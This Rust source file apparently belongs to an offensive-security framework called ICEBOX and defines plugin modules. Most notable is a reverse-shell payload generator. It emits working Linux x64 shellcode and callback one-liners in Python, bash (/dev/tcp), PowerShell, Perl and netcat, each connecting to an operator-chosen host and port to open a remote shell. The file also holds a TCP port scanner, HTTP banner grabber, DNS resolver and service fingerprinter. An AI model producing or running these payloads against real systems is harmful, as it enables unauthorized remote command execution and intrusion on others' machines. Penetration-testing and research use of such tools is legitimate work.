//! Native module registry: built-ins via linkme, runtime-loaded via WASM/libloading.

use async_trait::async_trait;
use icebox_core::module::{Module, ModuleError, ModuleEntry, ModuleResult};
use icebox_macro::module;
use linkme::distributed_slice;
use std::sync::Mutex;
use base64::Engine;
use base64::engine::general_purpose::STANDARD;

pub mod network_scanners;
pub mod recon_scanners;
pub mod vuln_scanner;

/// `linkme` only merges entries compiled into this crate, so built-ins live here
/// and contributor modules are appended at runtime via [`register_dynamic`].
#[distributed_slice]
pub static MODULE_REGISTRY: [ModuleEntry];

static DYNAMIC: Mutex<Vec<ModuleEntry>> = Mutex::new(Vec::new());

pub fn register_dynamic(entry: ModuleEntry) {
    let mut guard = match DYNAMIC.lock() {
        Ok(g) => g,
        // Recover from a poisoned mutex so a prior panic can't take down the
        // seam's module discovery on every subsequent run.
        Err(poisoned) => poisoned.into_inner(),
    };
    guard.push(entry);
}

pub fn discover() -> Vec<ModuleEntry> {
    let mut all: Vec<ModuleEntry> = MODULE_REGISTRY.iter().copied().collect();
    let guard = match DYNAMIC.lock() {
        Ok(g) => g,
        Err(poisoned) => poisoned.into_inner(),
    };
    all.extend(guard.iter().copied());
    all
}

pub fn load(name: &str) -> Option<icebox_core::module::LoadedModule> {
    discover()
        .into_iter()
        .find(|e| (e.info)().name == name)
        .map(|e| icebox_core::module::LoadedModule {
            info: (e.info)(),
            module: (e.make)(),
        })
}

fn generate_linux_x64_shellcode(lhost: &str, lport: u16) -> Result<Vec<u8>, ModuleError> {
    // sockaddr_in: sin_family at [21-22], sin_port at [23-24], sin_addr at [25-28].
    let mut sc = Vec::new();
    sc.extend_from_slice(&[0x6a, 0x29, 0x58, 0x99, 0x6a, 0x02, 0x5f, 0x6a, 0x01, 0x5e, 0x0f, 0x05]);
    sc.extend_from_slice(&[0x48, 0x97]);
    sc.extend_from_slice(&[0x4d, 0x31, 0xd2, 0x41, 0x52]);
    sc.extend_from_slice(&[0x48, 0xb9]);
    sc.extend_from_slice(&[0x02, 0x00]);                 // sin_family = AF_INET
    sc.extend_from_slice(&lport.to_be_bytes());          // sin_port (indices 23-24)
    sc.extend_from_slice(&lhost.parse::<std::net::Ipv4Addr>()
        .map_err(|_| ModuleError::Other(format!("invalid IPv4: {lhost}")))?
        .octets());                                      // sin_addr (indices 25-28)
    sc.push(0x51);
    sc.extend_from_slice(&[0x48, 0x89, 0xe6, 0x6a, 0x10, 0x5a, 0x6a, 0x2a, 0x58, 0x0f, 0x05]);
    sc.extend_from_slice(&[0x6a, 0x03, 0x5e]);
    sc.extend_from_slice(&[0x48, 0xff, 0xce, 0x6a, 0x21, 0x58, 0x0f, 0x05, 0x75, 0xf6]);
    sc.extend_from_slice(&[0x48, 0x31, 0xd2, 0x52]);
    sc.extend_from_slice(&[0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68]);
    sc.extend_from_slice(&[0x53, 0x48, 0x89, 0xe7]);
    sc.extend_from_slice(&[0x52, 0x57, 0x48, 0x89, 0xe6]);
    sc.extend_from_slice(&[0xb0, 0x3b, 0x0f, 0x05]);
    Ok(sc)
}

fn generate_python_shell(lhost: &str, lport: u16) -> String {
    format!(
        r#"import socket,subprocess,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty; pty.spawn("/bin/sh")
"#,
    )
}

fn generate_bash_shell(lhost: &str, lport: u16) -> String {
    format!("bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'")
}

fn generate_powershell_shell(lhost: &str, lport: u16) -> String {
    format!(
        r#"$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()
"#,
    )
}

fn generate_perl_shell(lhost: &str, lport: u16) -> String {
    format!(
        "perl -e 'use Socket;$i=\"{lhost}\";$p={lport};\n\
socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));\n\
if(connect(S,sockaddr_in($p,inet_aton($i)))){{\n\
    open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");\n\
    exec(\"/bin/sh -i\");\n\
}}'"
    )
}
fn generate_nc_shell(lhost: &str, lport: u16) -> String {
    format!(
        "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
    )
}

#[module(
    name = "reverse_shell_payload",
    kind = "Payload",
    description = "Multi-format reverse shell payload generator (shellcode + one-liners)",
    author = "ICEBOX",
)]
pub struct ReverseShell {
    #[option(required = true, help = "LHOST for callback (IP address)")]
    pub lhost: String,
    #[option(required = true, help = "LPORT for callback")]
    pub lport: u16,
    #[option(help = "Payload format: shellcode,python,bash,powershell,perl,nc,all (default: all)")]
    pub format: String,
}

#[async_trait]
impl Module for ReverseShell {
    fn options_json(&self) -> serde_json::Value {
        serde_json::to_value(&ReverseShellOptions {
            lhost: self.lhost.clone(),
            lport: self.lport,
            format: self.format.clone(),
        }).unwrap_or(serde_json::Value::Null)
    }

    fn set_option(&mut self, name: &str, value: &str) -> Result<(), ModuleError> {
        let mut o = ReverseShellOptions {
            lhost: self.lhost.clone(),
            lport: self.lport,
            format: self.format.clone(),
        };
        o.set(name, value)?;
        self.lhost = o.lhost;
        self.lport = o.lport;
        self.format = o.format;
        Ok(())
    }

    fn validate(&self) -> Result<(), ModuleError> {
        ReverseShellOptions {
            lhost: self.lhost.clone(),
            lport: self.lport,
            format: self.format.clone(),
        }.validate()?;
        self.lhost.parse::<std::net::Ipv4Addr>()
            .map_err(|_| ModuleError::Other(format!("invalid IPv4 address: {}", self.lhost)))?;
        Ok(())
    }

    async fn run(&self) -> Result<ModuleResult, ModuleError> {
        let lhost = self.lhost.trim().to_string();
        let lport = self.lport;
        let want = |f: &str| self.format.is_empty() || self.format == "all" || self.format.contains(f);

        let mut payloads = serde_json::Map::new();
        let mut evidence = Vec::new();

        if want("shellcode") {
            match generate_linux_x64_shellcode(&lhost, lport) {
                Ok(shellcode) => {
                    let hex = shellcode.iter().map(|b| format!("\\x{b:02x}")).collect::<String>();
                    let b64 = base64_encode(&shellcode);
                    let c_array = shellcode.iter().map(|b| format!("0x{b:02x}")).collect::<Vec<_>>().join(", ");
                    let c_code = format!("unsigned char buf[] = {{ {c_array} }};\nint len = sizeof(buf);\n");
                    payloads.insert("linux_x64_shellcode".into(), serde_json::json!({
                        "hex": hex,
                        "base64": b64,
                        "c_code": c_code,
                        "raw_len": shellcode.len(),
                    }));
                    evidence.push(format!("payload/shellcode ({} bytes)", shellcode.len()));
                }
                Err(e) => {
                    payloads.insert("linux_x64_shellcode_error".into(), serde_json::json!(e.to_string()));
                }
            }
        }

        if want("python") {
            let py = generate_python_shell(&lhost, lport);
            payloads.insert("python".into(), serde_json::json!(py));
            evidence.push("payload/python".into());
        }

        if want("bash") {
            let sh = generate_bash_shell(&lhost, lport);
            payloads.insert("bash".into(), serde_json::json!(sh));
            evidence.push("payload/bash".into());
        }

        if want("powershell") {
            let ps = generate_powershell_shell(&lhost, lport);
            payloads.insert("powershell".into(), serde_json::json!(ps));
            evidence.push("payload/powershell".into());
        }

        if want("perl") {
            let pl = generate_perl_shell(&lhost, lport);
            payloads.insert("perl".into(), serde_json::json!(pl));
            evidence.push("payload/perl".into());
        }

        if want("nc") {
            let nc = generate_nc_shell(&lhost, lport);
            payloads.insert("netcat".into(), serde_json::json!(nc));
            evidence.push("payload/netcat".into());
        }

        let count = payloads.len();
        Ok(ModuleResult {
            success: true,
            session_id: Some(format!("session:{lhost}:{lport}")),
            finding: Some(format!("Generated {count} payload format(s) for LHOST={lhost} LPORT={lport}")),
            evidence,
            data: serde_json::json!({
                "lhost": lhost,
                "lport": lport,
                "formats": self.format,
                "payloads": payloads,
                "count": count,
            }),
            ..Default::default()
        })
    }
}

fn base64_encode(data: &[u8]) -> String {
    STANDARD.encode(data)
}

pub(crate) fn hex_encode(data: &[u8]) -> String {
    hex::encode(data)
}

#[module(
    name = "tcp_port_scanner",
    kind = "Scanner",
    description = "TCP connect port scanner",
    author = "ICEBOX",
)]
pub struct TcpPortScanner {
    #[option(required = true, help = "Target IP or hostname")]
    pub host: String,
    #[option(required = true, help = "Ports to scan (e.g. 1-1024 or 22,80,443)")]
    pub ports: String,
    #[option(help = "Timeout per port in milliseconds (default 1000)")]
    pub timeout_ms: u64,
}

impl TcpPortScanner {
    fn resolve_ports(spec: &str) -> Result<Vec<u16>, ModuleError> {
        let mut ports = Vec::new();
        for part in spec.split(',') {
            let part = part.trim();
            if part.is_empty() {
                continue;
            }
            if let Some((lo, hi)) = part.split_once('-') {
                let lo: u16 = lo
                    .trim()
                    .parse()
                    .map_err(|_| ModuleError::Parse(format!("bad range lower: {lo}")))?;
                let hi: u16 = hi
                    .trim()
                    .parse()
                    .map_err(|_| ModuleError::Parse(format!("bad range upper: {hi}")))?;
                if lo > hi {
                    return Err(ModuleError::Parse(format!("range {lo} > {hi}")));
                }
                for p in lo..=hi {
                    ports.push(p);
                }
            } else {
                let p: u16 = part
                    .parse()
                    .map_err(|_| ModuleError::Parse(format!("bad port: {part}")))?;
                ports.push(p);
            }
        }
        if ports.is_empty() {
            return Err(ModuleError::Other("no ports specified".into()));
        }
        Ok(ports)
    }
}

#[async_trait]
impl Module for TcpPortScanner {
    fn options_json(&self) -> serde_json::Value {
        serde_json::to_value(&TcpPortScannerOptions {
            host: self.host.clone(),
            ports: self.ports.clone(),
            timeout_ms: self.timeout_ms,
        })
        .unwrap_or(serde_json::Value::Null)
    }

    fn set_option(&mut self, name: &str, value: &str) -> Result<(), ModuleError> {
        let mut o = TcpPortScannerOptions {
            host: self.host.clone(),
            ports: self.ports.clone(),
            timeout_ms: self.timeout_ms,
        };
        o.set(name, value)?;
        self.host = o.host;
        self.ports = o.ports;
        self.timeout_ms = o.timeout_ms;
        Ok(())
    }

    fn validate(&self) -> Result<(), ModuleError> {
        TcpPortScannerOptions {
            host: self.host.clone(),
            ports: self.ports.clone(),
            timeout_ms: self.timeout_ms,
        }
        .validate()?;
        Self::resolve_ports(&self.ports).map(|_| ())
    }

    

    async fn run(&self) -> Result<ModuleResult, ModuleError> {
        let ports = Self::resolve_ports(&self.ports)?;
        let timeout = if self.timeout_ms > 0 {
            std::time::Duration::from_millis(self.timeout_ms)
        } else {
            std::time::Duration::from_secs(1)
        };
        let host = self.host.clone();
        let concurrency = 100usize;
        let semaphore = std::sync::Arc::new(tokio::sync::Semaphore::new(concurrency));

        let mut handles = Vec::new();
        for port in ports {
            let permit = semaphore.clone().acquire_owned().await.map_err(|e| ModuleError::Other(e.to_string()))?;
            let h = host.clone();
            handles.push(tokio::spawn(async move {
                let _permit = permit;
                let addr = format!("{}:{}", h, port);
                match tokio::time::timeout(timeout, tokio::net::TcpStream::connect(&addr)).await {
                    Ok(Ok(_)) => Some(port),
                    _ => None,
                }
            }));
        }

        let mut open_ports: Vec<u16> = Vec::new();
        for h in handles {
            if let Ok(Some(port)) = h.await {
                open_ports.push(port);
            }
        }
        open_ports.sort();

        let finding = if open_ports.is_empty() {
            "No open ports found".to_string()
        } else {
            format!("Open ports: {}", open_ports.iter().map(|p| p.to_string()).collect::<Vec<_>>().join(", "))
        };

        Ok(ModuleResult {
            success: true,
            finding: Some(finding),
            evidence: open_ports.iter().map(|p| format!("tcp/{p}")).collect(),
            data: serde_json::json!({
                "host": self.host,
                "open_ports": open_ports,
            }),
            ..Default::default()
        })
    }
}

#[module(
    name = "http_probe",
    kind = "Scanner",
    description = "HTTP service banner grabber",
    author = "ICEBOX",
)]
pub struct HttpProbe {
    #[option(required = true, help = "Target IP or hostname")]
    pub host: String,
    #[option(required = true, help = "Ports to probe (comma-separated, e.g. 80,443,8080)")]
    pub ports: String,
    #[option(help = "Timeout per probe in milliseconds (default 3000)")]
    pub timeout_ms: u64,
}

#[async_trait]
impl Module for HttpProbe {
    fn options_json(&self) -> serde_json::Value {
        serde_json::to_value(&HttpProbeOptions {
            host: self.host.clone(),
            ports: self.ports.clone(),
            timeout_ms: self.timeout_ms,
        })
        .unwrap_or(serde_json::Value::Null)
    }

    fn set_option(&mut self, name: &str, value: &str) -> Result<(), ModuleError> {
        let mut o = HttpProbeOptions {
            host: self.host.clone(),
            ports: self.ports.clone(),
            timeout_ms: self.timeout_ms,
        };
        o.set(name, value)?;
        self.host = o.host;
        self.ports = o.ports;
        self.timeout_ms = o.timeout_ms;
        Ok(())
    }

    fn validate(&self) -> Result<(), ModuleError> {
        HttpProbeOptions {
            host: self.host.clone(),
            ports: self.ports.clone(),
            timeout_ms: self.timeout_ms,
        }
        .validate()
    }

    

    async fn run(&self) -> Result<ModuleResult, ModuleError> {
        let host = self.host.clone();
        let timeout = if self.timeout_ms > 0 {
            std::time::Duration::from_millis(self.timeout_ms)
        } else {
            std::time::Duration::from_secs(3)
        };

        let ports: Vec<&str> = self.ports.split(',').map(|s| s.trim()).filter(|s| !s.is_empty()).collect();
        if ports.is_empty() {
            return Err(ModuleError::Other("no ports specified".into()));
        }

        let concurrency = 20usize;
        let semaphore = std::sync::Arc::new(tokio::sync::Semaphore::new(concurrency));
        let mut handles = Vec::new();
        let request = b"GET / HTTP/1.0\r\nHost: placeholder\r\n\r\n";

        for port_str in ports {
            let port: u16 = port_str.parse().map_err(|_| ModuleError::Parse(format!("bad port: {port_str}")))?;
            let permit = semaphore.clone().acquire_owned().await.map_err(|e| ModuleError::Other(e.to_string()))?;
            let h = host.clone();
            let req = request.to_vec();
            handles.push(tokio::spawn(async move {
                let _permit = permit;
                let addr = format!("{}:{}", h, port);
                let stream = match tokio::time::timeout(timeout, tokio::net::TcpStream::connect(&addr)).await {
                    Ok(Ok(s)) => s,
                    _ => return None,
                };
                if tokio::time::timeout(timeout, stream.writable()).await.is_err() {
                    return None;
                }
                let _ = stream.try_write(&req);
                let mut buf = vec![0u8; 4096];
                let n = match tokio::time::timeout(timeout, stream.readable()).await {
                    Ok(_) => stream.try_read(&mut buf).unwrap_or(0),
                    _ => 0,
                };
                if n == 0 {
                    return None;
                }
                let resp = String::from_utf8_lossy(&buf[..n.min(1024)]).to_string();
                let first_line = resp.lines().next().unwrap_or("").to_string();
                let server = resp
                    .lines()
                    .find(|l| l.to_ascii_lowercase().starts_with("server:"))
                    .unwrap_or("")
                    .to_string();
                Some((port, first_line, server, resp.len()))
            }));
        }

        let mut services: Vec<serde_json::Value> = Vec::new();
        for h in handles {
            if let Ok(Some((port, status, server, size))) = h.await {
                services.push(serde_json::json!({
                    "port": port,
                    "status": status,
                    "server": if server.is_empty() { serde_json::Value::Null } else { serde_json::Value::String(server) },
                    "response_size": size,
                }));
            }
        }

        if services.is_empty() {
            return Ok(ModuleResult {
                success: true,
                finding: Some("No HTTP services detected on specified ports".into()),
                evidence: Vec::new(),
                data: serde_json::json!({ "host": self.host, "services": services }),
                ..Default::default()
            });
        }

        let banners: Vec<String> = services
            .iter()
            .map(|s| {
                let port = s["port"].as_u64().unwrap_or(0);
                let status = s["status"].as_str().unwrap_or("");
                let server = s["server"].as_str().unwrap_or("");
                format!("tcp/{port} {status} {server}")
            })
            .collect();

        Ok(ModuleResult {
            success: true,
            finding: Some(format!("Detected {} HTTP services", services.len())),
            evidence: banners,
            data: serde_json::json!({
                "host": self.host,
                "services": services,
            }),
            ..Default::default()
        })
    }
}

#[module(
    name = "dns_resolver",
    kind = "Auxiliary",
    description = "Resolve a hostname to IPv4/IPv6 addresses via system DNS",
    author = "ICEBOX",
)]
pub struct DnsResolver {
    #[option(required = true, help = "Hostname to resolve")]
    pub hostname: String,
}

#[async_trait]
impl Module for DnsResolver {
    fn options_json(&self) -> serde_json::Value {
        serde_json::to_value(&DnsResolverOptions { hostname: self.hostname.clone() })
            .unwrap_or(serde_json::Value::Null)
    }

    fn set_option(&mut self, name: &str, value: &str) -> Result<(), ModuleError> {
        let mut o = DnsResolverOptions { hostname: self.hostname.clone() };
        o.set(name, value)?;
        self.hostname = o.hostname;
        Ok(())
    }

    fn validate(&self) -> Result<(), ModuleError> {
        DnsResolverOptions { hostname: self.hostname.clone() }.validate()
    }

    async fn run(&self) -> Result<ModuleResult, ModuleError> {
        let hostname = self.hostname.trim();
        if hostname.is_empty() {
            return Err(ModuleError::Other("hostname required".into()));
        }
        let addrs: Vec<std::net::IpAddr> = match tokio::net::lookup_host((hostname, 0)).await {
            Ok(addrs) => addrs.map(|a| a.ip()).collect(),
            Err(e) => {
                return Ok(ModuleResult {
                    success: false,
                    finding: Some(format!("DNS resolution failed: {e}")),
                    evidence: vec![format!("dns_error: {e}")],
                    data: serde_json::json!({ "hostname": hostname, "error": e.to_string() }),
                    ..Default::default()
                });
            }
        };

        let v4: Vec<String> = addrs.iter().filter(|a| a.is_ipv4()).map(|a| a.to_string()).collect();
        let v6: Vec<String> = addrs.iter().filter(|a| a.is_ipv6()).map(|a| a.to_string()).collect();

        let count = addrs.len();
        let finding = if count == 0 {
            "No DNS records found".into()
        } else {
            format!("Resolved {count} address(es): {}", addrs.iter().map(|a| a.to_string()).collect::<Vec<_>>().join(", "))
        };

        Ok(ModuleResult {
            success: count > 0,
            finding: Some(finding),
            evidence: addrs.iter().map(|a| format!("dns/{a}")).collect(),
            data: serde_json::json!({
                "hostname": hostname,
                "ipv4": v4,
                "ipv6": v6,
                "addresses": addrs,
            }),
            ..Default::default()
        })
    }
}

#[module(
    name = "service_fingerprinter",
    kind = "Scanner",
    description = "Identify services on open ports via protocol banner grabbing",
    author = "ICEBOX",
)]
pub struct ServiceFingerprinter {
    #[option(required = true, help = "Target IP or hostname")]
    pub host: String,
    #[option(required = true, help = "Ports to fingerprint (comma-separated)")]
    pub ports: String,
    #[option(help = "Timeout per probe in milliseconds (default 3000)")]
    pub timeout_ms: u64,
}

impl ServiceFingerprinter {
    fn resolve_ports(spec: &str) -> Result<Vec<u16>, ModuleError> {
        let mut ports = Vec::new();
        for part in spec.split(',') {
            let p: u16 = part.trim().parse()
                .map_err(|_| ModuleError::Parse(format!("bad port: {part}")))?;
            ports.push(p);
        }
        if ports.is_empty() {
            return Err(ModuleError::Other("no ports specified".into()));
        }
        Ok(ports)
    }

    fn probe_for_port(port: u16) -> &'static [u8] {
        match port {
            21 => b"FEAT\r\n",
            22 => b"",
            23 => b"\r\n",
            25 => b"EHLO probe\r\n",
            53 => b"",  // DNS - banner reading not meaningful
            80 | 8080 | 8000 => b"GET / HTTP/1.0\r\nHost: localhost\r\n\r\n",
            110 => b"",
            111 => b"",
            135 => b"",
            139 => b"",
            143 => b"a001 LOGOUT\r\n",
            389 => b"",
            443 => b"", // TLS - handshake handled by raw connect
            445 => b"",
            993 => b"",
            995 => b"",
            3306 => b"",
            3389 => b"",
            5432 => b"",
            6379 => b"",
            8443 => b"GET / HTTP/1.0\r\nHost: localhost\r\n\r\n",
            27017 => b"",
            _ => b"",
        }
    }
}

#[async_trait]
impl Module for ServiceFingerprinter {
    fn options_json(&self) -> serde_json::Value {
        serde_json::to_value(&ServiceFingerprinterOptions {
            host: self.host.clone(),
            ports: self.ports.clone(),
            timeout_ms: self.timeout_ms,
        })
        .unwrap_or(serde_json::Value::Null)
    }

    fn set_option(&mut self, name: &str, value: &str) -> Result<(), ModuleError> {
        let mut o = ServiceFingerprinterOptions {
            host: self.host.clone(),
            ports: self.ports.clone(),
            timeout_ms: self.timeout_ms,
        };
        o.set(name, value)?;
        self.host = o.host;
        self.ports = o.ports;
        self.timeout_ms = o.timeout_ms;
        Ok(())
    }

    fn validate(&self) -> Result<(), ModuleError> {
        ServiceFingerprinterOptions {
            host: self.host.clone(),
            ports: self.ports.clone(),
            timeout_ms: self.timeout_ms,
        }
        .validate()
    }

    

    async fn run(&self) -> Result<ModuleResult, ModuleError> {
        let ports = Self::resolve_ports(&self.ports)?;
        let timeout = if self.timeout_ms > 0 {
            std::time::Duration::from_millis(self.timeout_ms)
        } else {
            std::time::Duration::from_secs(3)
        };
        let host = self.host.clone();

        let concurrency = 10usize;
        let semaphore = std::sync::Arc::new(tokio::sync::Semaphore::new(concurrency));

        let mut handles = Vec::new();
        for port in ports {
            let permit = semaphore.clone().acquire_owned().await.map_err(|e| ModuleError::Other(e.to_string()))?;
            let h = host.clone();
            let probe = Self::probe_for_port(port).to_vec();
            handles.push(tokio::spawn(async move {
                let _permit = permit;
                let addr = format!("{}:{}", h, port);
                let stream = match tokio::time::timeout(timeout, tokio::net::TcpStream::connect(&addr)).await {
                    Ok(Ok(s)) => s,
                    _ => return None,
                };
                if !probe.is_empty() {
                    let _ = stream.try_write(&probe);
                }
                let mut buf = vec![0u8; 4096];
                let read_timeout = timeout.min(std::time::Duration::from_secs(1));
                let n = match tokio::time::timeout(read_timeout, stream.readable()).await {
                    Ok(Ok(_)) => stream.try_read(&mut buf).unwrap_or(0),
                    _ => 0,
                };
                if n == 0 {
                    return Some((port, "open".into(), String::new()));
                }
                let raw = &buf[..n.min(1024)];
                let resp = String::from_utf8_lossy(raw).to_string();
                let clean: Vec<&str> = resp.lines().filter(|l| !l.is_empty()).collect();
                let banner = clean.join(" | ");
                let summary = clean.first().unwrap_or(&"").to_string();
                Some((port, summary, banner))
            }));
        }

        let mut services: Vec<serde_json::Value> = Vec::new();
        for h in handles {
            if let Ok(Some((port, summary, banner))) = h.await {
                services.push(serde_json::json!({
                    "port": port,
                    "summary": summary,
                    "banner": if banner.is_empty() { serde_json::Value::Null } else { serde_json::Value::String(banner) },
                }));
            }
        }

        let evidence: Vec<String> = services
            .iter()
            .map(|s| {
                let port = s["port"].as_u64().unwrap_or(0);
                let summary = s["summary"].as_str().unwrap_or("");
                format!("tcp/{port}: {summary}")
            })
            .collect();

        Ok(ModuleResult {
            success: true,
            finding: Some(format!("Fingerprinted {} service(s)", services.len())),
            evidence,
            data: serde_json::json!({
                "host": self.host,
                "services": services,
            }),
            ..Default::default()
        })
    }
}
